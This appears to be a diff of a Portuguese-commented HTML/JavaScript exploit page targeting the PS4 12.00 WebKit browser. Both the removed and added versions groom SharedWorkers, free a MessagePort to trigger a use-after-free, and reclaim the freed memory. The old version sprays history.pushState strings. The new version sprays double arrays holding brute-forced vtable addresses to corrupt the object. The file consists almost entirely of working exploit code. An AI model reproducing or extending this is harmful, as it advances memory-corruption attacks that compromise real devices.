@@ -2,185 +2,113 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.00 HISTORY SHOTGUN</title>
+    <title>PS4 12.00 VTABLE BRUTEFORCE</title>
     
 </head>
 <body>
 
-    <h1>PS4 12.00 - HISTORY STATE ATTACK</h1>
-    <h3>Estratégia: Furar IsoHeap com History API (Shotgun)</h3>
-
-    <button onclick="start_attack()">DISPARAR (HISTORY SPRAY)</button>
-
-    <div id="log">Sistema pronto.</div>
+    <h1>VTABLE BRUTEFORCE (Top 3 Candidates)</h1>
+    <div id="controls"></div>
+    <div id="log">Pronto.</div>
 
     <script>
-        // =================================================================
-        // 1. CONFIGURAÇÃO
-        // =================================================================
-        const CONFIG = {
-            WORKER_LIMIT: 404,
-            SPRAY_AMOUNT: 15000, // Quantidade de estados de histórico
-        };
-
-        // =================================================================
-        // 2. PREPARAÇÃO DA MUNIÇÃO (STRINGS)
-        // =================================================================
-        // Vamos criar strings que, somadas ao cabeçalho do History,
-        // resultem nos tamanhos alvo: 0xA0 (160) e 0xC0 (192).
-        
-        var payloads = [];
-
-        function prepare_ammo() {
-            log("Preparando munição de History State...", "info");
-            
-            // Tamanhos de alocação alvo (em bytes)
-            // Testamos uma faixa ao redor do 0xA0 e 0xC0
-            var target_allocs = [128, 144, 160, 176, 192, 208, 224, 256];
-            
-            // Header estimado do History no WebKit do PS4: ~24 a 32 bytes.
-            // JS String é UTF-16 (2 bytes por char).
-            // Formula aprox: (Target - Header) / 2 = Chars
-            
-            for (let alloc of target_allocs) {
-                // Tenta 3 variações de header para cada tamanho
-                for (let header_guess of [24, 32, 40]) {
-                    let char_count = Math.floor((alloc - header_guess) / 2);
-                    if (char_count < 4) continue;
-
-                    // Cria string "AAAA..."
-                    let str = "A".repeat(char_count);
-                    payloads.push(str);
-                }
-            }
-            log(`${payloads.length} variações de tamanho carregadas.`, "info");
-        }
-
-        // =================================================================
-        // 3. LOGGING
-        // =================================================================
-        function log(msg, type = "info") {
+        function log(msg, cls="") {
             var d = document.getElementById("log");
-            var color = "#ccc";
-            if (type === "success") color = "#0f0";
-            if (type === "fail") color = "#f55";
-            if (type === "warn") color = "#fa0";
-            
-            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
-        // =================================================================
-        // 4. EXECUÇÃO
-        // =================================================================
+        // CANDIDATOS EXTRAÍDOS
+        const CANDIDATES = [
+            0x2BB15A8n, 
+            0x2BB2208n, 
+            0x2E01C60n
+        ];
+
+        // Base Golden (A que deu Freeze antes)
+        const BASE = 0x820000000n;
+
+        // Tamanho Confirmado (0xC0 deu panic)
+        const SIZE = 0xC0; 
+
+        function build_payload(vtable_offset) {
+            // Double Array Spray (Butterfly Heap)
+            // 192 bytes total. 
+            // Header Array = 16 bytes. 
+            // Payload = 176 bytes / 8 = 22 elementos.
+            var arr = new Array(22);
+            
+            // Endereço Real da VTable
+            var vtable = BASE + vtable_offset;
+            
+            // Converte para Float
+            var buf = new ArrayBuffer(8);
+            var view = new DataView(buf);
+            view.setBigUint64(0, vtable, true);
+            var vtable_float = view.getFloat64(0, true);
+
+            // Enche o objeto
+            for(var i=0; i<arr.length; i++) arr[i] = vtable_float;
+            return arr;
+        }
+
         var workers_stash = [];
 
-        async function start_attack() {
-            if (!window.SharedWorker) return log("Erro: Navegador incompatível.", "fail");
+        async function run_test(idx) {
+            var offset = CANDIDATES[idx];
+            log(`>>> TESTANDO: 0x${offset.toString(16)} <<<`);
             
-            prepare_ammo();
-            log(">>> INICIANDO ATAQUE <<<", "warn");
+            var payload = build_payload(offset);
 
-            // 1. Grooming (380)
-            log("Grooming (380)...");
+            // Grooming
             for(let i=0; i<380; i++) {
                 try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
             }
 
-            // 2. Trigger Loop
-            let p_count = 0;
-            const limit = CONFIG.WORKER_LIMIT - 380;
-
-            var interval = setInterval(() => {
-                if (p_count >= limit) {
-                    clearInterval(interval);
+            // Trigger
+            var count = 0;
+            var it = setInterval(() => {
+                if(count >= 23) { // 403
+                    clearInterval(it);
                     
-                    // --- O ABATE ---
-                    log("!!! DISPARANDO UAF (403) !!!", "fail");
+                    var v = workers_stash.pop();
+                    var p = v.port;
+                    v.port.close();
                     
-                    // Vítima
-                    const victim = workers_stash.pop();
-                    const port = victim.port; 
+                    var spray = [];
+                    for(var k=0; k<30000; k++) spray.push(payload.slice(0));
                     
-                    // FREE
-                    victim.port.close();
-                    
-                    // HISTORY SPRAY (SHOTGUN)
-                    // Injeta todas as variações de tamanho rapidamente
-                    log("Injetando History States...");
-                    
-                    // Usamos um objeto complexo para evitar deduplicação de strings
-                    // e garantir alocação nova a cada push
-                    for(let k=0; k<CONFIG.SPRAY_AMOUNT; k++) {
-                        // Escolhe um tamanho da lista ciclicamente
-                        let payload = payloads[k % payloads.length];
-                        
-                        // Adiciona um número aleatório no fim para evitar cache, 
-                        // mas remove do início para manter o tamanho fixo
-                        let noise = Math.random().toString().substring(2, 6); // 4 chars
-                        let final_str = payload.substring(4) + noise;
-                        
-                        // PUSH
-                        history.pushState({ data: final_str }, "");
-                    }
-
-                    // CHECK
                     setTimeout(() => {
-                        check_success(port);
-                    }, 800);
-                    
+                        try {
+                            var s = p.toString();
+                            // Se não crashar e não for MessagePort -> Sucesso
+                            if (s.indexOf("MessagePort") === -1) {
+                                log("!!! SUCESSO !!!", "success");
+                                alert("VTable Correta: 0x" + offset.toString(16));
+                            } else {
+                                log("Falha: Objeto intacto.");
+                            }
+                        } catch(e) {
+                            log("Erro: " + e);
+                        }
+                        workers_stash.forEach(w=>{try{w.port.close()}catch(e){}});
+                        workers_stash = [];
+                    }, 500);
                     return;
                 }
-
-                try {
-                    let w = new SharedWorker("data:text,1", "v_"+p_count);
-                    w.port.start();
-                    workers_stash.push(w);
-                    if(p_count % 5 == 0) log(`Pressão: ${381+p_count}`);
-                } catch(e) {}
-                
-                p_count++;
-            }, 60);
+                try { workers_stash.push(new SharedWorker("data:text,1", "v"+count)); } catch(e){}
+                count++;
+            }, 50);
         }
 
-        function check_success(port) {
-            try {
-                var s = port.toString();
-                
-                // Se virou "AAAA..." ou crashou
-                if (s.indexOf("MessagePort") === -1) {
-                    log("!!! SUCESSO ABSOLUTO !!!", "success");
-                    log("Objeto Corrompido: " + s, "success");
-                    document.body.style.backgroundColor = "#004400";
-                    alert("LEAK CONFIRMADO VIA HISTORY!");
-                } else {
-                    log("Falha: Objeto intacto.");
-                    
-                    // Teste de estresse final
-                    try {
-                        // Força leitura de ponteiro
-                        let temp = port.onmessage; 
-                        
-                        // Tenta enviar mensagem (se o vtable estiver sujo, crasha)
-                        port.postMessage("PWN");
-                        
-                    } catch(e) {
-                        if(e.toString().match(/0x/)) {
-                            log("LEAK NO ERRO: " + e, "success");
-                            alert("LEAK NO ERRO!");
-                        }
-                    }
-                }
-            } catch(e) {
-                log("ERRO FATAL (BOM SINAL): " + e, "success");
-            }
-            
-            // Limpeza (Importante para não travar o PS4 depois)
-            workers_stash.forEach(w => { try{w.port.close()}catch(e){} });
-            // History state limpa sozinho ao recarregar
-        }
+        // UI
+        var div = document.getElementById("controls");
+        CANDIDATES.forEach((c, i) => {
+            var b = document.createElement("button");
+            b.innerText = `Testar 0x${c.toString(16)}`;
+            b.onclick = () => run_test(i);
+            div.appendChild(b);
+        });
     </script>
 </body>
 </html>
-
